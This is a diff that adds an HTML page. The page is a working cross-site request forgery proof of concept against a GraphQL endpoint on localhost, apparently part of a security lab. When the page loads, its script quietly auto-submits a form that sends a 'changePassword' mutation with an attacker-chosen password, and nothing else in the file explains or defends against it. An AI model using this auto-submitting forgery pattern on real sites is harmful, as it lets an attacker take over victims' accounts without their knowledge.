@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <form id="formUno" action="http://localhost:4000/graphql" method="POST"
+        enctype="application/x-www-form-urlencoded">
+</body>
+
+<script>
+    const targetUrl = "http://localhost:4000/graphql?query=" + encodeURIComponent('mutation { changePassword(password: "sucasucasuca") }');
+    const form = document.getElementById('formUno');
+    form.action = targetUrl;
+    
+    setTimeout(() => {
+        form.submit();
+    }, 500);
+</script>
+
+</html>
